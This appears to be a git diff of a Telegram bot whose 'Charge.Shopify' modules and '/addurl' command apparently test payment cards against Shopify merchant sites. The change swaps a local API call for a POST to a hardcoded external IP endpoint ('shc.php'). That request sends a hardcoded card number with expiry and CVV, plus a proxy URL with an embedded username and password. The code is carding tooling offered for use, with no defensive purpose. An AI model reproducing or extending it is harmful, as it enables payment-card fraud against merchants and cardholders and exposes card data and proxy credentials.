@@ -5,16 +5,15 @@ import httpx
 from pyrogram import Client, filters
 from pyrogram.types import Message
 from pyrogram.enums import ParseMode
-from BOT.Charge.Shopify.slf.api import autoshopify  # your actual API function
+# from BOT.Charge.Shopify.slf.api import autoshopify  # your actual API function
 
 SITES_PATH = "DATA/sites.json"
 TEST_CARD = "4342562842964445|04|26|568"
-API_ENDPOINT = "http://136.175.187.188:8079/shc.php"
 
 @Client.on_message(filters.command("addurl") & filters.private)
 async def add_site_api_based(client, message: Message):
     if len(message.command) < 2:
-        return await message.reply("❌ Please provide a site URL.\n\nExample:\n`/slfurl https://example.com`")
+        return await message.reply("❌ Please provide a site URL.\n\nExample:\n`/txturl https://example.com`")
 
     site = message.command[1]
     user_id = str(message.from_user.id)
@@ -23,8 +22,19 @@ async def add_site_api_based(client, message: Message):
     start_time = time.time()
 
     try:
+        url = "http://136.175.187.188:8079/shc.php"
+        payload = {
+            'cc': TEST_CARD,
+            'site': site,
+            'proxy': "http://tickets:proxyon145@107.150.71.30:12345"
+        }
+        
         async with httpx.AsyncClient(timeout=90.0) as session:
-            data = await autoshopify(site, TEST_CARD, session)
+            response = await session.post(url, data=payload)
+            try:
+                data = response.json()
+            except json.JSONDecodeError:
+                data = {"Response": response.text, "msg": response.text}
 
         end_time = time.time()
         time_taken = round(end_time - start_time, 2)
